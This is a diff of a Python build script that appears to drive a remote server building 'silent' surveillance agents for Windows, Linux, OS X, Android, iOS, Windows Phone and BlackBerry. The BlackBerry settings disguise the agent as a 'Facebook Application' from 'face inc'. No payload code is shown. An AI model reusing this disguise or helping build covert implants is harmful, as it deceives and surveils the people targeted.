@@ -27,16 +27,68 @@ servers = {
     }
 
 params = {
-    'platform_type': 'desktop',
-    'binary': {'admin': False, 'demo': False},
-    'melt': {'admin': False, 'bit64': True, 'codec': True, 'scout': True},
-    'platform': 'windows',
-    'meltfile': 'AVAgent/assets/windows/meltapp.exe',
-    'sign': {},
+    "desktop": {
+        "windows": {
+            'platform_type': 'desktop',
+            'binary': {'admin': False, 'demo': False},
+            'melt': {'admin': False, 'bit64': True, 'codec': True, 'scout': True},
+            'platform': 'windows',
+            'meltfile': 'AVAgent/assets/windows/meltapp.exe',
+            'sign': {},
+            },
+        "linux": {
+            'platform_type': 'desktop',
+            'binary': {'admin': False, 'demo': False},
+            'melt': {},
+            'platform': 'linux',
+            'package': {},
+        },
+        "osx": {
+            'platform_type': 'desktop',
+            'binary': {'admin': True, 'demo': False},
+            'melt': {},
+            'platform': 'osx',
+            'package': {},
+        },
+    },
+    "mobile": {
+        "android": {
+            'platform_type': 'mobile',
+            'binary': {'admin': False, 'demo': False},
+            'melt': {},
+            'platform': 'android',
+            'sign': {},
+            'package': {},
+        },
+        "ios": {
+            'platform_type': 'mobile',
+            'binary': {'demo': False},
+            'melt': {},
+            'platform': 'ios',
+            'package': {'type': 'local'}
+        },
+        "blackberry": {
+            'platform_type': 'mobile',
+            'binary': {'demo': False},
+            'melt': {'appname': 'facebook', 'desc': 'Applicazione utilissima di social network', 'name': 'Facebook Application', 'vendor': 'face inc', 'version': '1.2.3'},
+            'package': {'type': 'local'},
+            'platform': 'blackberry',
+        },
+        "winphone": {
+            'platform_type': 'desktop',
+            'binary': {'admin': True, 'demo': False},
+            'melt': {},
+            'platform': 'winphone',
+            'package': {}
+        }
+    }
 }
 
 
 def build_server(kind, platform_type, platform, srv, factory=None):
+    global params
+
+
     class Args:
         pass
 
@@ -57,8 +109,8 @@ def build_server(kind, platform_type, platform, srv, factory=None):
     args.frontend = srv_params["frontend"]
     args.platform_type = platform_type
     args.operation = srv_params["operation"]
-    args.param = params
-    args.asset_dir = "/Users/olli/Documents/work/AVTest/AVAgent/assets"
+    args.param = params[platform_type][platform]
+    args.asset_dir = "assets"
 
     # servono??
     args.blacklist = ""
@@ -81,8 +133,24 @@ def build_server(kind, platform_type, platform, srv, factory=None):
 
 def main():
     print "let's build ya"
-    if build_server("silent", "desktop", "windows", "castore") is False:
-        print "problem build from server"
+
+    p = {
+        "desktop": ["windows", "linux", "osx"],
+        "mobile": ["android","ios","winphone", "blackberry"],
+    }
+
+
+#    build_server("silent", "desktop", "linux", "castore")
+#      print "problem build linux"
+#
+    for plat in p:
+        print "building %s" % plat
+        for os in p[plat]:
+            print "building os %s" % os
+            if build_server("silent", plat, os, "castore") is False:
+                print "problem build %s %s" % (plat, os)
+
+    print "all done"
 
 if __name__ == "__main__":
     main()
